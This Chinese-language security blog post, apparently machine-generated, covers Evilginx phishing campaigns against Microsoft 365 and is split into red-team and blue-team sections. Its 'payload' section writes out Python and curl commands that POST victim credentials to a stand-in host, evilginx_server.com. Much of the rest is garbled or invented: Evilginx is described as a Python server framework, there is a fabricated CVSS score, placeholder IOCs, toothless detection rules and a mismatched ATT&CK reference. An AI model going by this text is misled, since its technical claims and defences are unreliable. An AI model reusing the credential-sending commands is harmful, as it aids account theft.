---
layout: post
title:  "駭客的伺服器設定疏忽，意外暴露3起針對Microsoft 365的Evilginx釣魚攻擊活動"
date:   2026-07-21 13:24:55 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Evilginx 釣魚攻擊：技術細節與防禦策略
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: 資料竊取 (Info Leak)
> * **關鍵技術**: `Evilginx`, `AiTM`, `Device Code`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Evilginx 釣魚框架利用 Python 網頁伺服器的公開目錄列表，允許攻擊者建立客製化的釣魚工具，繞過 Microsoft 365 的多因素驗證（MFA）機制。
* **攻擊流程圖解**: 
    1. 攻擊者建立 Evilginx 釣魚工具
    2. 受害者訪問釣魚網站
    3. Evilginx 收集受害者的帳號憑證與驗證權杖
    4. 攻擊者使用 AiTM 或 Device Code 繞過 MFA
* **受影響元件**: Microsoft 365、Python 網頁伺服器

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要建立 Evilginx 釣魚工具和 Python 網頁伺服器
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # Evilginx Payload
    payload = {
        "username": "victim_username",
        "password": "victim_password"
    }
    
    # 發送請求到 Evilginx 伺服器
    response = requests.post("https://evilginx_server.com/login", data=payload)
    
    ```
    *範例指令*: 使用 `curl` 發送請求到 Evilginx 伺服器

```

bash
curl -X POST -d "username=victim_username&password=victim_password" https://evilginx_server.com/login

```
* **繞過技術**: AiTM 和 Device Code 可用於繞過 MFA

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | evilginx_server.com | /login |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Evilginx_Detection {
        meta:
            description = "Evilginx 釣魚工具偵測"
            author = "Your Name"
        strings:
            $a = "Evilginx" ascii
            $b = "login" ascii
        condition:
            $a and $b
    }
    
    ```
    或者是具體的 **SIEM 查詢語法** (Splunk/Elastic)

```

sql
index=web_logs (url="/login" AND user_agent="*Evilginx*")

```
* **緩解措施**: 更新 Microsoft 365 的安全設定，啟用 MFA 和條件式存取

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Evilginx**: 想像一個釣魚工具，可以模擬登入頁面，技術上是指一個 Python 網頁伺服器框架，允許攻擊者建立客製化的釣魚工具。
* **AiTM (Adversary-in-the-Middle)**: 想像一個中間人，可以截取和修改通信數據，技術上是指一個攻擊技術，允許攻擊者在受害者和目標系統之間建立一個中間人，繞過 MFA。
* **Device Code**: 想像一個驗證碼，可以用於驗證用戶身份，技術上是指一個驗證機制，允許用戶使用驗證碼驗證其身份，繞過 MFA。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/177493)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1189/)


